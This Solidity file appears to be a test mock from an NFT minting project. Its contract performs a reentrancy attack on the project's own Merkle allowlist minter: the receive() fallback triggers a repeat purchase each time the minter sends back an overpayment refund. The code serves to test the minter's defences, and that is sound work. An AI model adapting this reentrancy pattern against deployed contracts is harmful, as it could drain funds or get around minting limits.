// SPDX-License-Identifier: LGPL-3.0-only
// Created By: Art Blocks Inc.

import "../interfaces/0.8.x/IFilteredMinterMerkleV0.sol";

pragma solidity ^0.8.0;

/**
 * @dev This contract is tailored to attacks our merkle allowlist minter with a
 * reentrency attack. It simulates the case where an artist allowlists a
 * malicious contract.
 * @dev Note that a simple contract like this assumes a specific Merkle proof
 * depth. In this case, a Merkle proof depth of 3 is assumed (since it
 * integrates well with our tests). More complex strategies could be used to
 * write a more flexible reentrency attack contract, but it doesn't add more
 * value to our test suite at this time.
 */
contract ReentrancyMerkleMock {
    uint256 public currentQtyToPurchase;
    uint256 public currentProjectId;
    uint256 public currentPriceToPay;
    bytes32[3] currentProof;

    /**
        @notice This function can be called to induce controlled reentrency attacks
        on AB minter filter suite's Merkle minter (originally designed for V0). 
        Note that _priceToPay should be > project price per token to induce refund, 
        making reentrency possible via fallback function.
     */
    function attack(
        uint256 _qtyToPurchase,
        address _minterContractAddress,
        uint256 _projectId,
        uint256 _priceToPay,
        bytes32[] memory _proof
    ) external payable {
        currentQtyToPurchase = _qtyToPurchase;
        currentProjectId = _projectId;
        currentPriceToPay = _priceToPay;
        currentProof[0] = _proof[0];
        currentProof[1] = _proof[1];
        currentProof[2] = _proof[2];
        IFilteredMinterMerkleV0(_minterContractAddress).purchase{
            value: _priceToPay
        }(_projectId, _proof);
    }

    // receiver is called when minter sends refunded Ether to this contract.
    receive() external payable {
        // decrement num to be purchased
        currentQtyToPurchase--;
        if (currentQtyToPurchase > 0) {
            // rebuild _proof
            bytes32[] memory _proof = new bytes32[](3);
            _proof[0] = currentProof[0];
            _proof[1] = currentProof[1];
            _proof[2] = currentProof[2];
            // purchase again!
            IFilteredMinterMerkleV0(msg.sender).purchase{
                value: currentPriceToPay
            }(currentProjectId, _proof);
        }
    }
}
